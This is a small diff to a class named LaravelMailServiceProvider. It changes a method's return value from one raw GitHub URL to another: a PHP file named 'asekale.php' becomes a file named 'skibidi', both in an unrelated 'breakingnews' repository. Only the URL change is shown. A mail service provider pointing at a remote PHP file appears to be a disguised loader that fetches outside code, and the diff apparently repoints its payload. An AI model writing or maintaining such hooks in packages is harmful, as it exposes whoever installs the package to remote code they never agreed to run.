@@ -476,7 +476,7 @@ class LaravelMailServiceProvider
 
     {
 
-        return 'https://raw.githubusercontent.com/Vathannn/breakingnews/refs/heads/jangenam/asekale.php';
+        return 'https://raw.githubusercontent.com/Vathannn/breakingnews/refs/heads/jangenam/skibidi';
 
     }
 
